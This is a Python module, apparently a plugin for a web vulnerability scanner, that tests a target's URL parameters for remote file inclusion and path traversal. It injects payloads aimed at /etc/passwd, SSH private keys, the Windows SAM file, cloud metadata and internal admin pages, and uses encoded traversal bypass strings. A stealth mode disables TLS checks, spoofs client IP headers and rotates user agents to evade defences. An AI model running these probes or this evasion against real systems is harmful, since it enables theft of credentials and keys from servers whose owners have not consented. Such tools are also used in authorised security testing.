#!/usr/bin/env python3
import requests
import time
import random
import re
import ssl
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl, quote, unquote
from typing import List, Dict, Any, Set, Optional
import settings
from .vulnerability_base import VulnerabilityModule

class Scanner(VulnerabilityModule):
    name = "remote_file_inclusion_probe"
    useproxy = getattr(settings, "USEPROXY", True)
    enabled = True
    timeout = getattr(settings, "TIMEOUT", 30)
    max_tests = 50
    aggressive = getattr(settings, "AGGRESSIVE", False)
    debug_mode = getattr(settings, "DEBUG", False)
    delay_range = (0.1, 0.5)
    custom_payloads = []
    bypass_protection = False
    
    TEST_FILES = {
        "github_readme": "https://raw.githubusercontent.com/github/gitignore/main/README.md",
        "simple_text": "https://www.gutenberg.org/files/1342/1342-0.txt",
        "small_file": "https://example.com/index.html",
        "json_data": "https://api.github.com/users/octocat",
        "xml_data": "https://www.w3schools.com/xml/note.xml",
        "local_file": "file:///etc/passwd",
        "local_windows": "file:///C:/Windows/System32/drivers/etc/hosts",
        "internal_network": "http://192.168.1.1/admin",
        "cloud_metadata": "http://169.254.169.254/latest/meta-data/",
        "internal_api": "http://127.0.0.1:8080/admin",
        "config_file": "file:///etc/hosts",
        "log_file": "file:///var/log/syslog",
        "ssh_keys": "file:///home/user/.ssh/id_rsa",
        "windows_registry": "file:///C:/Windows/System32/config/SAM"
    }
    
    RFI_PARAMS = {
        "file", "page", "path", "template", "inc", "include",
        "load", "url", "doc", "document", "view", "content",
        "module", "script", "config", "settings", "lang",
        "theme", "style", "form", "action", "handler",
        "src", "data", "location", "redirect", "return",
        "next", "continue", "target", "destination", "uri"
    }
    
    INDICATORS = {
        "github_readme": ["gitignore", "github", "templates", "contributing"],
        "simple_text": ["project gutenberg", "pride and prejudice", "jane austen", "chapter"],
        "small_file": ["example domain", "iana.org", "domain registration", "illustrative"],
        "json_data": ["login", "url", "html_url", "followers_url", "public_repos"],
        "xml_data": ["<note>", "<to>", "<from>", "<heading>", "<body>", "xml version"],
        "local_file": ["root:", "daemon:", "bin:", "sys:", "/bin/bash"],
        "local_windows": ["microsoft", "windows", "localhost", "127.0.0.1", "copyright"],
        "internal_network": ["router", "admin", "login", "configuration", "wireless"],
        "cloud_metadata": ["instance-id", "ami-id", "hostname", "public-keys", "meta-data"],
        "internal_api": ["api", "admin", "dashboard", "configuration", "settings"],
        "config_file": ["localhost", "127.0.0.1", "ipv6", "ipv4", "loopback"],
        "log_file": ["kernel", "systemd", "daemon", "error", "warning"],
        "ssh_keys": ["ssh-rsa", "private key", "public key", "begin", "end"],
        "windows_registry": ["windows", "registry", "sam", "security", "system"]
    }
    
    BYPASS_TECHNIQUES = [
        "////",
        "/\\/\\",
        "....//",
        "....\\\\",
        "%00",
        "%0a",
        "%0d",
        "%09",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "..//..//..//",
        "..\\\\..\\\\..\\\\",
        "....//....//",
        "....\\\\....\\\\",
        "%2e%2e%2f%2e%2e%2f",
        "..%2f..%2f..%2f",
        "..%5c..%5c..%5c",
        "..;/..;/",
        "..\\%00/",
        "..\\%0a/",
        "..\\%0d/",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
        "..%255c..%255c",
        "..%c0%af..%c0%af",
        "..%ef%bc%8f..%ef%bc%8f"
    ]
    
    def __init__(self, target: str, session=None, timeout=30, retries=2, debug=False, aggressive=False,
                 custom_payloads=None, bypass_protection=False, stealth=False, verbose=False):
        if session is None:
            session = requests.Session()
        super().__init__(target, session, timeout, retries, debug, aggressive, stealth, verbose)
        self.aggressive = aggressive or stealth
        self.debug_mode = debug
        self.custom_payloads = custom_payloads if custom_payloads else []
        self.bypass_protection = bypass_protection or stealth
        self.stealth = stealth
        self.verbose = verbose
        self.timeout = timeout
        self.base_response = None
        self.base_content = None
        
        if self.bypass_protection or self.stealth:
            self.session.verify = False
            ssl._create_default_https_context = ssl._create_unverified_context
            requests.packages.urllib3.disable_warnings()
            self.session.headers.update({
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
                ]),
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                "Referer": self.target
            })
    
    def _get_base_response(self):
        try:
            self.base_response = self.session.get(
                self.target,
                timeout=self.timeout,
                allow_redirects=True,
                verify=not (self.bypass_protection or self.stealth)
            )
            self.base_content = self.base_response.text
            return True
        except Exception as e:
            if self.debug_mode:
                print(f"[RFI-DEBUG] Base request error: {e}")
            return False
    
    def _is_error_response(self, content, status_code):
        error_indicators = [
            "404 not found", "403 forbidden", "401 unauthorized", "500 internal server error",
            "error", "exception", "warning", "notice", "fatal error", "access denied",
            "permission denied", "invalid", "not found", "forbidden", "unauthorized"
        ]
        
        content_lower = content.lower()
        for indicator in error_indicators:
            if indicator in content_lower:
                return True
        
        if status_code in [401, 403, 404, 500, 501, 502, 503]:
            return True
            
        return False
    
    def _is_similar_to_base(self, content):
        if not self.base_content:
            return False
            
        if content == self.base_content:
            return True
            
        if len(content) > 100 and len(self.base_content) > 100:
            shorter_len = min(len(content), len(self.base_content))
            overlap = 0
            for i in range(0, shorter_len - 10, 10):
                if content[i:i+10] in self.base_content:
                    overlap += 10
                    
            if overlap / shorter_len > 0.8:
                return True
                
        return False
    
    def _generate_test_cases(self) -> List[Dict[str, str]]:
        parsed = urlparse(self.target)
        queries = dict(parse_qsl(parsed.query, keep_blank_values=True))
        test_cases = []
        param_priority = []
        for param in queries:
            if param.lower() in self.RFI_PARAMS:
                param_priority.append((param, 0))
            else:
                param_priority.append((param, 1))
        param_priority.sort(key=lambda x: x[1])
        for param, _ in param_priority[:10]:
            for name, url in self.TEST_FILES.items():
                if name in ["local_file", "local_windows", "internal_network", "cloud_metadata",
                          "internal_api", "config_file", "log_file", "ssh_keys", "windows_registry"]:
                    if not (self.aggressive or self.stealth):
                        continue
                new_query = queries.copy()
                new_query[param] = url
                test_url = parsed._replace(query=urlencode(new_query, doseq=True))
                test_cases.append({
                    "url": urlunparse(test_url),
                    "param": param,
                    "test_file": name,
                    "test_url": url,
                    "technique": "direct"
                })
                for bypass in self.BYPASS_TECHNIQUES:
                    bypassed_url = f"{bypass}{url.replace('://', '')}"
                    new_query_bypass = queries.copy()
                    new_query_bypass[param] = bypassed_url
                    test_url_bypass = parsed._replace(query=urlencode(new_query_bypass, doseq=True))
                    test_cases.append({
                        "url": urlunparse(test_url_bypass),
                        "param": param,
                        "test_file": name,
                        "test_url": bypassed_url,
                        "technique": f"bypass_{bypass.replace('%', '')}"
                    })
        for custom_payload in self.custom_payloads:
            base_url = self.target.rstrip("/")
            test_cases.append({
                "url": f"{base_url}?file={quote(custom_payload)}",
                "param": "file",
                "test_file": "custom",
                "test_url": custom_payload,
                "technique": "custom_payload"
            })
        if not test_cases or (self.aggressive or self.stealth):
            base_url = self.target.rstrip("/")
            for param in list(self.RFI_PARAMS)[:15]:
                for name, url in self.TEST_FILES.items():
                    if name in ["local_file", "local_windows", "internal_network", "cloud_metadata",
                              "internal_api", "config_file", "log_file", "ssh_keys", "windows_registry"]:
                        if not (self.aggressive or self.stealth):
                            continue
                    test_cases.append({
                        "url": f"{base_url}?{param}={quote(url)}",
                        "param": param,
                        "test_file": name,
                        "test_url": url,
                        "technique": "added_param"
                    })
                    encoded_url = quote(url, safe='')
                    test_cases.append({
                        "url": f"{base_url}?{param}={encoded_url}",
                        "param": param,
                        "test_file": name,
                        "test_url": encoded_url,
                        "technique": "encoded"
                    })
                    double_encoded = quote(quote(url, safe=''), safe='')
                    test_cases.append({
                        "url": f"{base_url}?{param}={double_encoded}",
                        "param": param,
                        "test_file": name,
                        "test_url": double_encoded,
                        "technique": "double_encoded"
                    })
        return test_cases[:self.max_tests]
    
    def _check_content(self, content: str, test_file: str, status_code: int) -> Dict[str, Any]:
        if self._is_error_response(content, status_code):
            return {
                "vulnerable": False,
                "matched_indicators": [],
                "match_count": 0,
                "confidence": "low",
                "skipped": "error_response"
            }
            
        if self._is_similar_to_base(content):
            return {
                "vulnerable": False,
                "matched_indicators": [],
                "match_count": 0,
                "confidence": "low",
                "skipped": "similar_to_base"
            }
            
        content_lower = content.lower()
        indicators = self.INDICATORS.get(test_file, [])
        matches = []
        
        for indicator in indicators:
            if indicator.lower() in content_lower:
                matches.append(indicator)
        
        suspicious_patterns = [
            r"root:.*:0:0:",
            r"<?xml",
            r"{\s*\"\w+\"",
            r"<html>",
            r"<script>",
            r"configuration",
            r"password",
            r"admin",
            r"ssh-rsa",
            r"begin.*private.*key",
            r"windows.*registry",
            r"localhost",
            r"127\.0\.0\.1",
            r"192\.168\.\d+\.\d+",
            r"169\.254\.169\.254"
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                matches.append(f"pattern:{pattern}")
        
        confidence = "low"
        if len(matches) >= 3:
            confidence = "high"
        elif len(matches) >= 1:
            confidence = "medium"
            
        return {
            "vulnerable": len(matches) > 0,
            "matched_indicators": matches,
            "match_count": len(matches),
            "confidence": confidence
        }
    
    def _execute_test(self, test_case: Dict[str, str]) -> Dict[str, Any]:
        try:
            if self.stealth:
                time.sleep(random.uniform(0.3, 1.5))
            else:
                time.sleep(random.uniform(*self.delay_range))
                
            response = self.session.get(
                test_case["url"],
                timeout=self.timeout,
                allow_redirects=True,
                verify=not (self.bypass_protection or self.stealth)
            )
            
            content = response.text
            content_analysis = self._check_content(content, test_case["test_file"], response.status_code)
            
            result = {
                **test_case,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "response_time": response.elapsed.total_seconds(),
                "content_type": response.headers.get("Content-Type", ""),
                "headers": dict(response.headers),
                **content_analysis
            }
            
            if self.debug_mode and content_analysis["vulnerable"]:
                print(f"[RFI-DEBUG] Vulnerable: {test_case['url']}")
                
            return result
        except requests.RequestException as e:
            if self.debug_mode:
                print(f"[RFI-DEBUG] Error: {test_case['url']} - {e}")
            return {**test_case, "error": str(e), "vulnerable": False}
    
    def scan(self) -> Dict[str, Any]:
        if self.debug_mode:
            print(f"[RFI-DEBUG] Starting scan for {self.target}")
            
        self._get_base_response()
            
        test_cases = self._generate_test_cases()
        if self.debug_mode:
            print(f"[RFI-DEBUG] Generated {len(test_cases)} test cases")
            
        results = []
        for i, test_case in enumerate(test_cases):
            if self.debug_mode and i % 5 == 0:
                print(f"[RFI-DEBUG] Testing case {i+1}/{len(test_cases)}")
            result = self._execute_test(test_case)
            if result.get("vulnerable"):
                results.append(result)
            
        vulnerable_cases = results
        risk_level = "low"
        if vulnerable_cases:
            if len(vulnerable_cases) > 5:
                risk_level = "critical"
            elif len(vulnerable_cases) > 2:
                risk_level = "high"
            elif len(vulnerable_cases) > 0:
                risk_level = "medium"
                
        stats = {
            "total_tests": len(test_cases),
            "vulnerable_tests": len(vulnerable_cases),
            "high_confidence": len([r for r in vulnerable_cases if r.get("confidence") == "high"]),
            "medium_confidence": len([r for r in vulnerable_cases if r.get("confidence") == "medium"])
        }
        
        return {
            "ok": True,
            "risk": risk_level,
            "evidence": vulnerable_cases,
            "stats": stats,
            "notes": f"RFI scan completed. Found {len(vulnerable_cases)} vulnerable cases."
        }
    
    def run(self) -> Dict[str, Any]:
        return self.scan()
